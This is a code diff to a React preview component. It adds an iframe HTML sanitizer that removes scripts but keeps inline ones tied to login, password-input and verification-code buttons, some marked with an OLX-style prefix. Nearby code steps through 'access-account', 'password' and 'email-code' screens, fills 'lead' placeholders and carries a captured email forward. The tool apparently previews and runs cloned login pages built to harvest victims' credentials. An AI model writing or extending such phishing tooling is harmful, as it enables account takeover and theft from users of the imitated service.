@@ -21,6 +21,33 @@ interface PreviewFrameProps {
   adId?: string;
 }
 
+function sanitizeIframeHtml(rawHtml: string): string {
+  if (!rawHtml || !/<script|<link/i.test(rawHtml)) return rawHtml;
+
+  try {
+    const doc = new DOMParser().parseFromString(rawHtml, "text/html");
+
+    doc.querySelectorAll("script").forEach((script) => {
+      const src = script.getAttribute("src")?.trim();
+      const content = script.textContent || "";
+      const isManualScreenScript =
+        !src && /iframe-help-action|iframe-link-click|btn-entrar|resend-btn|code-submit|pw-input|__olx_/i.test(content);
+
+      if (!isManualScreenScript) {
+        script.remove();
+      }
+    });
+
+    doc
+      .querySelectorAll('link[rel="preload"][as="script"], link[rel="modulepreload"], link[rel="prefetch"][as="script"]')
+      .forEach((link) => link.remove());
+
+    return "<!DOCTYPE html>\n" + doc.documentElement.outerHTML;
+  } catch {
+    return rawHtml;
+  }
+}
+
 export function PreviewFrame({ html, mode = "mobile", className, adId }: PreviewFrameProps) {
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [height, setHeight] = useState<number>(800);
@@ -124,7 +151,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     if (!iframeRef.current) return;
     const iframe = iframeRef.current;
 
-    let injected = html || "<html><body></body></html>";
+    let injected = sanitizeIframeHtml(html || "<html><body></body></html>");
     if (mode === "mobile" && !/<meta[^>]+viewport/i.test(injected)) {
       injected = injected.replace(
         /<head[^>]*>/i,
@@ -231,7 +258,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     const navigateToScreen = (screen: AdScreen) => {
       const screenHtml = decompressStoredHtml(screen.edited_html || screen.original_html || "");
       if (!screenHtml) return;
-      let nextHtml = applyLeadPlaceholders(screenHtml, leadsRef.current);
+       let nextHtml = applyLeadPlaceholders(sanitizeIframeHtml(screenHtml), leadsRef.current);
       const capturedEmail = capturedEmailRef.current.trim();
       if (capturedEmail && (screen.kind === "access-account" || screen.kind === "password" || screen.kind === "email-code")) {
         nextHtml = nextHtml.replace(
